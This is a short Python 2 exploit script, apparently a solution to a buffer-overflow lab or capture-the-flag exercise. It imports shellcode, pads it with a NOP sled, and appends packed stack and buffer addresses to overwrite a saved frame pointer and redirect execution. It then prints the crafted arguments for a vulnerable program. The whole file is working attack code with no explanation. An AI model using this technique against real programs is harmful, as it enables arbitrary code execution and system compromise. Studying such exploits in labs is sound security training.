from shellcode import shellcode
from struct import pack

ebp = 0xbffef458
buf = 0x080f3750

padding = '\x90' * (40 - len(shellcode))

arg1 = shellcode 
arg2 = shellcode + padding + pack("<I", ebp) + pack("<I", buf)
arg3 = shellcode

print arg1, arg2, arg3
